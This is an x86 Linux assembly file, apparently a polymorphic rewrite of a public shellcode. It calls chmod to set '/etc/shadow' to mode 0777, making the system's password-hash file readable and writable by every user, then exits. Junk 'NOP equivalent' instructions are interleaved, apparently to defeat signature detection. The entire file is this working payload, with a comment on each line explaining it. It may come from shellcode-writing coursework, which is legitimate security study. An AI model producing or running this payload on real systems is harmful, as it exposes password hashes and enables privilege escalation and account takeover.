; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-590.php

global _start

_start:

std                ; NOP Equivalent.

xor eax, eax       ; Zeroes out EAX.
cdq                ; Zeroes out EDX.
push edx           ; Pushes the dword of EDX (0x00000000).
mov al, 0xf        ; Moves value of syscall chmod into AL.

sahf               ; NOP Equivalent.
push 0x776f6461    ; woda

cld                ; NOP Equivalent.
push 0x68732f63    ; hs/c

push 0x74652f2f    ; te//
cdq                ; NOP Equivalent.

mov ebx, esp       ; Copies value from ESP to EBX.
pushfd             ; NOP Equivalent.
mov cx, 0x1ff      ; Value that means in octal "0777".
cmc                ; NOP Equivalent.
int  0x80          ; Call to kernel.

inc eax            ; Increment EAX to 1, value for syscall exit().
pushfd             ; NOP Equivalent.
int 0x80           ; Call to kernel.
